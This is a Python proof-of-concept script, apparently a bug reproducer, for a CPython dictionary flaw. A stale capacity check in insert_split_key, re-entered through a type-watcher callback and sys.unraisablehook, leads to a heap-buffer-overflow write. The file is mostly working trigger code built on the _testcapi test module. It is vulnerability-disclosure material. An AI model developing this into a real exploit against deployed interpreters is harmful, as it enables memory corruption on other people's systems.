"""insert_split_key: stale `dk_usable > 0` check across a Python-running call.

Objects/dictobject.c:1964

    if (ix == DKIX_EMPTY && keys->dk_usable > 0) {   # <-- capacity checked HERE
        ...
        if (type) {
            _PyType_Modified_Unlocked(type);         # <-- runs ARBITRARY PYTHON
        }
        Py_ssize_t hashpos = find_empty_slot(keys, hash);
        ix = keys->dk_nentries;                      # <-- re-read AFTER
        dictkeys_set_index(keys, hashpos, ix);
        PyDictUnicodeEntry *ep = &DK_UNICODE_ENTRIES(keys)[ix];   # <-- WRITE
        STORE_SHARED_KEY(ep->me_key, Py_NewRef(key));
        split_keys_entry_added(keys);                # dk_usable--, dk_nentries++
    }

`_PyType_Modified_Unlocked` runs a type-watcher callback and, if that callback
fails, `PyErr_FormatUnraisable` -> `sys.unraisablehook` == arbitrary Python.
Re-entering `obj.attr = v` from there consumes shared-key slots; the outer frame
never re-checks `dk_usable` and writes at the stale-approved index anyway.

Two consequences on the DEFAULT GIL build (LOCK_KEYS is a no-op there, so this
is NOT the free-threaded deadlock of CPY-0096):

  A. dk_usable drops below 0 -- the invariant `_PyDict_CheckConsistency`
     asserts (`CHECK(0 <= dk_usable ...)`) is broken.
  B. `store_instance_attr_lock_held` then writes `values->values[ix]` with ix
     past the object's inline-values region -> heap-buffer-overflow WRITE.

Nesting depth is what turns (A) into (B): every nested frame passes the
capacity check with the SAME pre-consumption dk_usable, and each one writes a
distinct, ever-higher index on the way out.

Usage:  python insert_split_key_stale_usable_overflow.py [depth]
"""

import sys

import _testcapi


DEPTH = int(sys.argv[1]) if len(sys.argv) > 1 else 40


class C:
    """Plain heap type -> shared/split keys -> insert_split_key is used."""


def main():
    # kind=1 -> type_modified_callback_error: returns -1 with an exception set,
    # forcing typeobject.c:1223 PyErr_FormatUnraisable -> sys.unraisablehook.
    wid = _testcapi.add_type_watcher(1)
    _testcapi.watch_type(wid, C)

    depth = [0]
    objs = []

    def hook(unraisable):
        # Runs from inside _PyType_Modified_Unlocked, i.e. from inside
        # insert_split_key AFTER its dk_usable check and BEFORE its write.
        if depth[0] >= DEPTH:
            return
        depth[0] += 1
        # Re-arm the type version tag: _PyType_Modified_Unlocked returns early
        # when tp_version_tag == 0, so without this the nested call runs no
        # Python and the recursion stops at one level.
        try:
            C.__init__
        except AttributeError:
            pass
        o = C()
        objs.append(o)
        # A brand-new attribute name -> a new shared-key slot -> nested
        # insert_split_key, which passes the SAME stale dk_usable check.
        setattr(o, "a%d" % depth[0], depth[0])

    sys.unraisablehook = hook

    root = C()
    objs.append(root)
    print("[main] depth target = %d" % DEPTH, flush=True)
    root.first = 1
    print("[main] returned; reached depth %d" % depth[0], flush=True)

    # Touch every object so a corrupted inline-values array is also *read*.
    total = 0
    for o in objs:
        total += len(o.__dict__)
    print("[main] survived, total attrs = %d" % total, flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
